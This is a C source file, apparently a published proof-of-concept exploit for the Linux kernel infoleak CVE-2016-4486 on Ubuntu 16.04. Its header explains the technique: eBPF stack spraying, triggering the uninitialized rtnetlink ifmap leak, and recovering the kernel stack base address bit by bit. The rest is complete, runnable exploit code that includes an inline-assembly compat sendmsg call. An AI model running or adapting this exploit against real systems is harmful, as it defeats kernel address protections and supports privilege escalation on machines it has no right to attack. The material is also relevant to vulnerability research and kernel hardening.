/*
 * [ Briefs ]
 *    - CVE-2016-4486 has discovered and reported by Kangjie Lu.
 *    - This is local exploit against the CVE-2016-4486.
 *
 * [ Tested version ]
 *    - Distro :  Ubuntu 16.04
 *    - Kernel version :  4.4.0-21-generic
 *    - Arch : x86_64
 *
 * [ Prerequisites ]
 *    - None
 *
 * [ Goal ]
 *    - Leak kernel stack base address of current process by exploiting CVE-2016-4486.
 *
 * [ Exploitation ]
 *    - CVE-2016-4486 leaks 32-bits arbitrary kernel memory from uninitialized stack.
 *    - This exploit gets 61-bits stack base address among the 64-bits full address.
 *      remaining 3-bits is not leaked because of limitation of ebpf.
 *    - Full exploitation are performed as follows.
 *
 *    1. Spraying kernel stack as kernel stack address via running ebpf program.
 *       - We can spray stack up to 512-bytes by running ebpf program.
 *       - After this step, memory to be leaked will be filled with kernel stack address.
 *    2. Trigger CVE-2016-4486 to leak 4-bytes which is low part of stack address.
 *       - After this step, stack address :  0xffff8800????????;  (? is unknown address yet.)
 *    3. Leak high 4-bytes of stack address. The leaking is done as one-by-one bit. why one-by-one?
 *       - CVE-2016-4486 allows to leak 4-bytes only, so that we always get low 4-bytes of stack address.
 *       - Then, How to overcome this challenge?? The one of possible answer is that
 *         do operation on high-4bytes with carefully selected value which changes low-4bytes.
 *         For example, Assume that real stack address is 0xffff880412340000;
 *         and, do sub operation. ==> 0xffff880412340000 - 0x0000000012360000 (selected value);
 *         The result will be "0xffff8803....." ==> Yap! low 4-bytes are changed!! and We can see this!
 *         The result makes us to know that high 4-bytes are smaller than 0x12360000;
 *         Then, We can keep going with smaller value.
 *       - The algorithm is quite similar to quick-search.
 *    4. Unfortunately, ebpf program limitation stops us to leak full 64-bits.
 *       - 3-bits (bit[16], bit[15], bit[14]) are not leaked.
 *       - But, Since 3-bit is not sufficient randomness, It's very valuable for attacker.
 *    Bonus) Why do I use compat_sendmsg() instead of normal sendmsg()?
 *       - When I did spraying stack with normal sendmsg(), I couldn't spray up to memory to be leaked.
 *       - If I use compat-sendmsg(), The execution path will be different from normal sendmsg().
 *         This makes me to spray it more far.
 *
 * [ Run exploit ]
 *    - $ gcc poc.c -o poc
 *    - $ ./poc
 *        ....
 *        ....
 *        leak stack address range :
 *        -----from :  ffff88007f7e0000
 *        --------to : ffff88007f7fc000
 *       (Since we can get 61-bit address, Print the possible address range out.)
 *
 * [ Contact ]
 *    - jinb.park7@gmail.com
 *    - github.com/jinb-park
 */

#include <asm/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <asm/unistd_64.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/bpf.h>
#include <linux/filter.h>

#define GPLv2 "GPL v2"
#define ARRSIZE(x) (sizeof(x) / sizeof((x)[0]))

#define INTERFACE_INDEX (0)
#define LEAK_OFFSET (28)

/*
 * BPF-based stack sprayer
 */
/* registers */
/* caller-saved: r0..r5 */
#define BPF_REG_ARG1    BPF_REG_1
#define BPF_REG_ARG2    BPF_REG_2
#define BPF_REG_ARG3    BPF_REG_3
#define BPF_REG_ARG4    BPF_REG_4
#define BPF_REG_ARG5    BPF_REG_5
#define BPF_REG_CTX     BPF_REG_6
#define BPF_REG_FP      BPF_REG_10

#define BPF_MOV32_REG(DST, SRC)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU | BPF_MOV | BPF_X,       \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_ST_MEM(SIZE, DST, OFF, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_STX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_STX_ADD_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_STX | BPF_XADD | BPF_SIZE(SIZE),\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_MOV64_IMM(DST, IMM)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_EXIT_INSN()                         \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_EXIT,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_MOV64_REG(DST, SRC)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_ALU64_IMM(OP, DST, IMM)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_ALU64_REG(OP, DST, SRC)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })

int bpf_(int cmd, union bpf_attr *attrs)
{
    return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

int prog_load(struct bpf_insn *insns, size_t insns_count)
{
    char verifier_log[100000];
    union bpf_attr create_prog_attrs = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = insns_count,
        .insns = (uint64_t)insns,
        .license = (uint64_t)GPLv2,
        .log_level = 1,
        .log_size = sizeof(verifier_log),
        .log_buf = (uint64_t)verifier_log
    };
    int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
    int errno_ = errno;
    errno = errno_;
    if (progfd == -1) {
		printf("bpf prog load error\n");
		exit(-1);
	}
    return progfd;
}

int create_socket_by_socketpair(int *progfd)
{
	int socks[2];
    if (socketpair(AF_UNIX, SOCK_SEQPACKET, 0, socks)) {
        printf("socketpair error\n");
        exit(-1);
    }
    if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, progfd, sizeof(int))) {
        printf("setsockopt error\n");
        exit(-1);
    }
    return socks[1];
}

int create_filtered_socket_fd(struct bpf_insn *insns, size_t insns_count)
{
    int progfd = prog_load(insns, insns_count);
	return create_socket_by_socketpair(&progfd);
}

#define NR_sendmsg_32 370	// for 32-bit

typedef unsigned int compat_uptr_t;
typedef int compat_int_t;
typedef unsigned int compat_size_t;
typedef unsigned int compat_uint_t;

struct compat_msghdr {
    compat_uptr_t   msg_name;   /* void * */
    compat_int_t    msg_namelen;
    compat_uptr_t   msg_iov;    /* struct compat_iovec * */
    compat_size_t   msg_iovlen;
    compat_uptr_t   msg_control;    /* void * */
    compat_size_t   msg_controllen;
    compat_uint_t   msg_flags;
};
struct compat_iovec {
    compat_uptr_t   iov_base;
    compat_size_t   iov_len;
};

int sendmsg_by_legacy_call(int fd, unsigned int msg, int flags)
{
	int r = -1;

	asm volatile (
		"push %%rax\n"
		"push %%rbx\n"
		"push %%rcx\n"
		"push %%rdx\n"
		"push %%rsi\n"
		"push %%rdi\n"
		"mov %1, %%eax\n"
		"mov %2, %%ebx\n"
		"mov %3, %%ecx\n"
		"mov %4, %%edx\n"
		"int $0x80\n"
		"mov %%eax, %0\n"
		"pop %%rdi\n"
		"pop %%rsi\n"
		"pop %%rdx\n"
		"pop %%rcx\n"
		"pop %%rbx\n"
		"pop %%rax\n"
		: "=r" (r)
		: "r"(NR_sendmsg_32), "r"(fd), "r"(msg), "r"(flags)
		: "memory", "rax", "rbx", "rcx", "rdx", "rsi", "rdi"
	);

	return r;
}

#define COMPAT_SENDMSG
void trigger_proc(int sockfd)
{
#ifdef COMPAT_SENDMSG
	struct compat_msghdr *msg = NULL;
	struct compat_iovec *iov = NULL;
#else
	struct msghdr *msg = NULL;
	struct iovec *iov = NULL;
#endif
	char *buf = NULL;
	int r;

	// allocate under-32-bit address for compat syscall
	msg = mmap(0x70000, 4096, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if (msg == MAP_FAILED) {
		printf("mmap error : %d, %s\n", errno, strerror(errno));
		exit(0);
	}
	buf = mmap(0x90000, 4096, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if (buf == MAP_FAILED) {
		printf("mmap error : %d, %s\n", errno, strerror(errno));
		exit(0);
	}
	iov = mmap(0xb0000, 4096, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if (buf == MAP_FAILED) {
		printf("mmap error : %d, %s\n", errno, strerror(errno));
		exit(0);
	}

#ifdef COMPAT_SENDMSG
	iov->iov_base = (compat_uptr_t)buf;
#else
	iov->iov_base = buf;
#endif
	iov->iov_len = 128;
	msg->msg_name = NULL;
	msg->msg_namelen = 0;
#ifdef COMPAT_SENDMSG
	msg->msg_iov = (compat_uptr_t)iov;
#else
	msg->msg_iov = iov;
#endif
	msg->msg_iovlen = 1;
	msg->msg_control = NULL;
	msg->msg_controllen = 0;
	msg->msg_flags = 0;

#ifdef COMPAT_SENDMSG
	r = sendmsg_by_legacy_call(sockfd, (unsigned int)msg, 0);
#else
	r = sendmsg(sockfd, msg, 0);
#endif
	if (r < 0) {
		printf("sendmsg error, %d, %s\n", errno, strerror(errno));
		exit(-1);
	}
}

int sockfds = -1;

void stack_spraying_by_bpf(unsigned long val)
{
	int r;

	struct bpf_insn stack_spraying_insns[] = {
		BPF_MOV64_REG(BPF_REG_3, BPF_REG_FP),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -val),

		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -368),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -376),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -384),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -392),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -400),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -408),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -416),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -424),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -432),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -440),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -448),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -456),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -464),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -472),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -480),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -488),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -496),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -504),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -512),

		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN()
	};

	sockfds = create_filtered_socket_fd(stack_spraying_insns, ARRSIZE(stack_spraying_insns));
	if (sockfds < 0)
		return;

	trigger_proc(sockfds);
    close(sockfds);
	//sleep(1);
}

/*
28byte, 32byte including padding
struct rtnl_link_ifmap {
    __u64   mem_start;
    __u64   mem_end;
    __u64   base_addr;
    __u16   irq;
    __u8    dma;
    __u8    port;
};*/

// rtnl_fill_link_ifmap <-- rtnl_fill_ifinfo (symbol)

struct {
	struct nlmsghdr nh;
	struct ifinfomsg ifm;
	char attrbuf[512];
} req;

// Ubuntu 4.4.0-21-generic
#define RANGE_MIN_MASK ~((1<<16) | (1<<15) | (1<<14)) // and
#define RANGE_MAX_MASK ((1<<16) | (1<<15) | (1<<14)) // or

int main(int argc, char **argv)
{
	unsigned char buf[65535];
  	unsigned char map_buf[36] = {0,};
  	struct nlmsghdr *nl_msg_ptr;
  	struct ifinfomsg *inf_msg_ptr;
  	struct rtnl_link_ifmap *map_ptr;
  	struct rtattr *rta_ptr;
  	int size, len, attr_len, offset;
	int progfd;
	unsigned int sub_val = 0;
	unsigned int leak_value;
	unsigned long leak_full_stack = 0;
	unsigned int low_stack = 0;
	int i;

	for (i=0; i<16; i++) {
		int rtnetlink_sk = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_ROUTE);

		memset(&req, 0, sizeof(req));

		req.nh.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
		req.nh.nlmsg_flags = NLM_F_DUMP | NLM_F_REQUEST;
		req.nh.nlmsg_type = RTM_GETLINK;
		req.nh.nlmsg_seq = 1;

		req.ifm.ifi_family = AF_UNSPEC;
		req.ifm.ifi_index = INTERFACE_INDEX;
		req.ifm.ifi_change = 0xffffffff;

		if (i == 0)
			sub_val = 0;
		else
			sub_val += (1 << (32 - i));

		stack_spraying_by_bpf((unsigned long)sub_val);
		if (send(rtnetlink_sk, &req, req.nh.nlmsg_len, 0) < 0) {
			printf("send error\n");
			goto out;
		}

		while (1) {
			if ((size = recv(rtnetlink_sk, buf, sizeof(buf), 0)) < 0) {
				fprintf(stderr, "ERROR recv(): %s\n", strerror(errno));
				goto out;
			}

			for (nl_msg_ptr = (struct nlmsghdr *)buf; size > (int)sizeof(*nl_msg_ptr);) {
				len = nl_msg_ptr->nlmsg_len;

				if (nl_msg_ptr->nlmsg_type == NLMSG_ERROR) {
					printf("NLMSG_ERROR\n");
					goto out;
				}
				else if (nl_msg_ptr->nlmsg_type == NLMSG_DONE)
					break;

				if (!NLMSG_OK(nl_msg_ptr, (unsigned int)size)) {
					printf("Not OK\n");
					goto out;
				}

				attr_len = IFLA_PAYLOAD(nl_msg_ptr);
				inf_msg_ptr = (struct ifinfomsg *)NLMSG_DATA(nl_msg_ptr);
				rta_ptr = (struct rtattr *)IFLA_RTA(inf_msg_ptr);

				for (; RTA_OK(rta_ptr, attr_len); rta_ptr = RTA_NEXT(rta_ptr, attr_len)) {
					if (rta_ptr->rta_type == IFLA_MAP) {
						if (rta_ptr->rta_len != sizeof(map_buf)) {
							printf("wrong size\n");
							goto out;
						}

						memcpy(map_buf, RTA_DATA(rta_ptr), sizeof(map_buf));
						map_ptr = &map_buf;
						leak_value = *(unsigned int *)(map_buf + LEAK_OFFSET);
						printf("leak_value : %08x\n", leak_value);
						break;
					}
				}

				size -= NLMSG_ALIGN(len);
				nl_msg_ptr = (struct nlmsghdr *)((char *)nl_msg_ptr + NLMSG_ALIGN(len));
			}

			break;
		}

		if (low_stack == 0)
			low_stack = leak_value;
		else
			if (leak_value != low_stack)
				sub_val &= (~(1 << (32 - i)));	// clear bit

		memcpy((unsigned char *)&leak_full_stack + 4, &low_stack, 4);
		memcpy((unsigned char *)&leak_full_stack, &sub_val, 4);
		printf("[try-%d] stack address : %lx\n", i, leak_full_stack);
out:
		close(rtnetlink_sk);
	}

	printf("=======================================================================\n");
	printf("leak stack address range : \n");
	printf("-----from :  %lx\n", leak_full_stack & RANGE_MIN_MASK);
	printf("--------to : %lx\n", leak_full_stack | RANGE_MAX_MASK);
	printf("======================================================================\n");

	return 0;
}